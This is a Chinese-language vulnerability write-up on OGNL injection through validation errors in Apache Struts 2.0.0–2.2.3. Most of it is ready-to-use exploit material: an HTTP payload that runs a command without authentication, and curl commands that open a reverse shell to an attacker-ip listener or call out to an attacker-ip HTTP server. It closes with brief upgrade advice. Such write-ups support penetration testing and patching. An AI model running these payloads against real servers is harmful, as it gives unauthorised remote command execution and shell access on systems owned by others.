## 漏洞描述

当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。攻击者可以通过构造恶意的表单值，利用类型验证错误注入 OGNL 表达式执行任意命令。

## 影响版本

- Apache Struts 2.0.0 - 2.2.3

## 前置条件

- 无需认证
- 目标应用配置了验证规则

## 利用步骤

1. 找到配置了验证规则的表单
2. 提交错误类型的值触发验证失败
3. 在值中注入 OGNL 表达式

## Payload

```http
POST /user.action HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

age='%20+%20(%23_memberAccess["allowStaticMethodAccess"]=true,#foo=new%20java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("touch%20/tmp/success"))%20+%20'
```

## 验证方法

```bash
# 此漏洞为OGNL注入RCE，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动监听
nc -lvp 4444

# 使用反弹shell payload
curl -X POST "http://target:8080/user.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "age='+%20+(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23foo=new%20java.lang.Boolean(%22false%22),%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%23foo,@java.lang.Runtime@getRuntime().exec(%22bash%20-i%20%3E&%20%2Fdev%2Ftcp%2Fattacker-ip%2F4444%200%3E&1%22))+%20'"

# 或使用HTTP外带验证（推荐，攻击者服务器启动: python3 -m http.server 8080）
curl -X POST "http://target:8080/user.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "age='+%20+(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23foo=new%20java.lang.Boolean(%22false%22),%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%23foo,@java.lang.Runtime@getRuntime().exec(%22curl%20http://attacker-ip:8080/whoami%22))+%20'"
# 检查HTTP服务器日志是否有回连
```

## 修复建议

1. 升级 Apache Struts 至 2.2.4+
2. 对用户输入进行严格类型验证
3. 避免在错误处理中进行 OGNL 表达式解析
